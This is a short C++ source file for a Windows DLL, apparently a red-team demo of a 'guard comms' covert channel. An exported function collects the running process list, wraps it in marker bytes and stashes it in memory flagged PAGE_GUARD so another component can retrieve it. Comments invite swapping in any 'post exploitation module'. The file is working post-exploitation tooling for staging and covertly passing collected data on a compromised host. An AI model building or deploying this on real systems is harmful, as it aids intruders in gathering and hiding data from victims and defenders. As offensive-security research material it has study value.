
/*THISE CODE DEMOES GUARD COMMS TECHNIQUE*/
/*WRITTEN BY ASAURUSREX*/

//#include "pch.h"
#include <windows.h>
//#include "ProcessListing_no_std.h"
#include "ProcessListing.h"
#include <iostream> 
#include <string>



using namespace std;

#include <tlhelp32.h>
#include <stdio.h>


extern "C"  __declspec(dllexport) void CALLBACK ExportedFunction()
{
   
    
    //replace this with your desired post exploitation module
    std::wstring process_list = GetProcessList();

    //Sleep(1000 * 5);
    std::wstring message = L"HEADERBYTES" + process_list + L"FOOTERBYTES";
    
    
    SIZE_T bytes_written = 0;

    //allocate memory
    LPVOID baseaddr = VirtualAlloc(NULL, message.size()*2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    //write to memory
    WriteProcessMemory(GetCurrentProcess(), baseaddr, message.data(), message.size()*2, &bytes_written);
    DWORD old_protect = 0;
    //change permissions to PAGE_GUARD
    VirtualProtect(baseaddr, message.size()*2, PAGE_READWRITE | PAGE_GUARD, &old_protect);

    return;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        //doesn't need to be here, can change behaviors if built in such a way that the DLL attaches to the process immediately, but you can play with it
        //ExportedFunction();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

